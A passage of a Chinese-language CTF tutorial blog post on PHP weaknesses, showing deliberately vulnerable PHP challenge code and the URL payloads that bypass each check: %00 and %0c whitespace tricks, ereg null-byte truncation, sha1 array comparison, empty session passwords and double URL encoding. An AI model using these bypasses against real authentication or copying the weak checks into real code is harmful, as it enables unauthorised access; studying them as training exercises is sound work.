    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$global_var</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//trim — 去除字符串首尾处的空白字符（或者其他字符）</span>
        <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span>
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
 
 
<span class="token keyword">function</span> <span class="token function-definition function">is_palindrome_number</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token variable">$number</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//strval — 获取变量的字符串值</span>
    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
    <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//strlen — 获取字符串长度</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$j</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$number</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
        <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span> 
        <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
 
 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//is_numeric — 检测变量是否为数字或数字字符串 </span>
<span class="token punctuation">&#123;</span>
 
   <span class="token variable">$info</span><span class="token operator">=</span><span class="token string double-quoted-string">"sorry, you cann't input a number!"</span><span class="token punctuation">;</span>
 
<span class="token punctuation">&#125;</span>
<span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//intval — 获取变量的整数值</span>
<span class="token punctuation">&#123;</span>
 
     <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"number must be equal to it's integer!! "</span><span class="token punctuation">;</span>  
 
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
 
     <span class="token variable">$value1</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token variable">$value2</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value1</span><span class="token operator">!=</span><span class="token variable">$value2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
          <span class="token variable">$info</span><span class="token operator">=</span><span class="token string double-quoted-string">"no, this is not a palindrome number!"</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
     <span class="token keyword">else</span>
     <span class="token punctuation">&#123;</span>
 
          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_palindrome_number</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
              <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"nice! <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$value1</span><span class="token punctuation">&#125;</span></span> is a palindrome number!"</span><span class="token punctuation">;</span> 
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">else</span>
          <span class="token punctuation">&#123;</span>
             <span class="token variable">$info</span><span class="token operator">=</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span>
 
<span class="token punctuation">&#125;</span>
 
<span class="token keyword">echo</span> <span class="token variable">$info</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们这里可以分段代码审计一下</p>
<p>首先告诉我们需要传进去一个 GET 请求的参数，名为 number；</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

 <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span>

 <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"have a fun!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//die — 等同于 exit()</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>往下看 </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$global_var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//foreach 语法结构提供了遍历数组的简单方式</span>

 <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$global_var</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

 <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//trim — 去除字符串首尾处的空白字符（或者其他字符）</span>

 <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span>

 <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的代码不难，读取到我们所有的 GET 请求与 POST 请求的参数，进行循环，然后把这个参数里面的空格去掉，这就是过滤空白字符了。</p>
<p>继续往下看 <code>is_palindrome_number()</code> 函数，用来判断是否为回文数。</p>
<p>后续是判断关键，总结一下有以下四个条件</p>
<pre class="line-numbers language-none"><code class="language-none">1、if(is_numeric($_REQUEST[&#39;number&#39;])) 这个条件需要为假，才能继续往下运行 
2、要求$req[&#39;number&#39;]&#x3D;&#x3D;strval(intval($req[&#39;number&#39;])) 
3、要求intval($req[&quot;number&quot;])&#x3D;&#x3D;intval(strrev($req[&quot;number&quot;]));&#x2F;&#x2F;strrev函数作用是反转字符串 
4、 if(is_palindrome_number($req[&quot;number&quot;]))这个条件需要为假，才能输出flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>第一个条件，这里我们不能输入 <code>?number=1</code>，要不然进不到后续的代码逻辑上，通过 <code>?number=%001</code> 可以绕过</p>
<p>针对<br><code>$req[&#39;number&#39;]==strval(intval($req[&#39;number&#39;]))</code><br>的话，它这个相当于是不让变量中有字符串，只能有数字时才符合条件，这个是怎么知道的呢，当然是本地测试</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
	
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一般的话肯定考虑一个空格给它绕过，但是这段代码里传入的变量都经过了 <code>trim</code> 函数，trim 函数过滤了很多空白字符</p>
<img src="/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/trim.png" class="">

<p>一般的话当然是没办法了，但是这里还有一个<code>%0c</code>，也就是<code>\f</code>未被过滤，因此这里我们可以用它来进行绕过，我们本地试也可以发现它是符合条件的</p>
<img src="/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/fBypass.png" class="">

<p>现在来看第三个条件 <code>intval($req[&quot;number&quot;])==intval(strrev($req[&quot;number&quot;]));</code>，这个 <code>strrev</code> 函数的作用是反转字符串，这里的话也就是要求数字是回文数，比如 131，这个时候反转一下还是 131，此时就可以满足条件了</p>
<p>来看最后一个，让 <code>if(is_palindrome_number($req[&quot;number&quot;]))</code> 条件为假，这个函数定义如下</p>
<p>这个函数当它是回文数时就会正确，因此看似是与条件三矛盾的，但想到还有空白字符，用它的时候同时写回文数，此时是不是就可以成功绕过呢</p>
<p>我们尝试 payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>number<span class="token operator">=</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">0</span>c131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功 getflag</p>
<img src="/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/02Pass.png" class="">

<h3 id="5-ereg-x2F-preg-match-正则-00-截断"><a href="#5-ereg-x2F-preg-match-正则-00-截断" class="headerlink" title="5. ereg&#x2F;preg_match 正则 %00 截断"></a>5. ereg&#x2F;preg_match 正则 %00 截断</h3><ul>
<li>源码如下</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 

<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z0-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p>You password must be alphanumeric&lt;/p>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">9999999</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'*-*'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token comment">//strpos — 查找字符串首次出现的位置</span>
      <span class="token punctuation">&#123;</span>
      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Flag: '</span> <span class="token operator">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;p>*-* have not been found&lt;/p>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
       <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
     <span class="token keyword">else</span> 
     <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p>Invalid password&lt;/p>'</span><span class="token punctuation">;</span> 
      <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>这里的话有三个条件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span>、 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z0-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span>
<span class="token number">2</span>、<span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">9999999</span><span class="token punctuation">)</span>
<span class="token number">3</span>、  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'*-*'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>第一个，就是匹配里面要有字母与数字，没事；<br>第二个比较要动脑，要求我们的密码值大于 9999999，但是不得超过 8 位，你细品；<br>第三个让password中包含<code>*-*</code>，这与第一点相悖了，思考这个绕过。</p>
<p>第一个先不考虑，直接看第二个，第二个的绕过很简单，用科学计数法即可。</p>
<p>payload：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?password&#x3D;1e10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>第三个条件这里，要与第一个相结合的绕过：</p>
<p>我们知道当语句遇到%00的时候就会认为是休止符，不再往后看，我们如果在password中添加%00，再添加这个字符串，是不是就可以成功绕过呢，我们构造 payload 如下进行尝试</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?password&#x3D;1e10%00*-*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功绕过</p>
<h3 id="6-sha-函数比较绕过"><a href="#6-sha-函数比较绕过" class="headerlink" title="6. sha()函数比较绕过"></a>6. sha()函数比较绕过</h3><p>源代码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p>Your password can not be your name!&lt;/p>'</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Flag: '</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p>Invalid password.&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p>Login first!&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>这里的逻辑简单看一下，很简单，看着就好绕过；要求是传入的 username 和 password 不能相同，但是它们经过 sha1() 算法之后的值要相同。</li>
</ul>
<p>sha1 算法加密的同样是字符串，那就意味着当值为数组时同样会报错，如果我们让两个都报错，那么他们肯定是同种类型的 Null，此时就可以绕过，正常的话我们会构造 payload 如下</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">name[]&#x3D;1&amp;password[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/shaBypass.png" class="">

<h3 id="7-session-验证绕过"><a href="#7-session-验证绕过" class="headerlink" title="7. session 验证绕过"></a>7. session 验证绕过</h3><p>源代码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">// 08 SESSION验证绕过

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>

<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'Flag: '</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">print</span> <span class="token string single-quoted-string">'&lt;p>Wrong guess.&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>条件是 <code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code>，这里 session 中的 password 是不存在的，需要我们自己传值，那我们如果不传的话不就为 Null 了吗，此时我们的 GET 传 password 也传个空，此时两者是不是就相等了呢，我们尝试一下</p>
<p>payload:</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?password&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SessionBypass.png" class="">

<h3 id="8-urldecode-二次编码绕过"><a href="#8-urldecode-二次编码绕过" class="headerlink" title="8. urldecode 二次编码绕过"></a>8. urldecode 二次编码绕过</h3><ul>
<li>原代码如下</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hackerDJ"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>not allowed!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"hackerDJ"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Access granted!&lt;/p>"</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>flag: *****************&#125; &lt;/p>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写的和那啥一样，一塌糊涂，这里我修改了一下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">// 10 urldecode二次编码绕过

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hackerDJ"</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>not allowed!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$flag</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
